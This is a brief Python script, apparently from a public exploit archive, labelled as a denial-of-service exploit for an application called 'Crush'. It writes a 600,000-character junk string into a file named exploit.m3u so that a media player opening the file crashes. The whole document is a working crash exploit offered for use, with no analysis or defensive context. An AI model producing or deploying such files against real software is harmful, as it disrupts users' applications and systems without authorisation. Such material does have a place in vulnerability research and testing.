
#!/usr/bin/python
# Exploit Title: Denial of service (Crush application) V1
# Date: [2016-May-18]
# Exploit Author: Austin Vern Songber
# E-Mail:  austinvernsonger <at> outlook.com
# Version: [1] 
# Tested on: windows 7 x86


junk="A"*600000
file = "exploit.m3u"
f=open(file,"w")
f.write(junk);
f.close();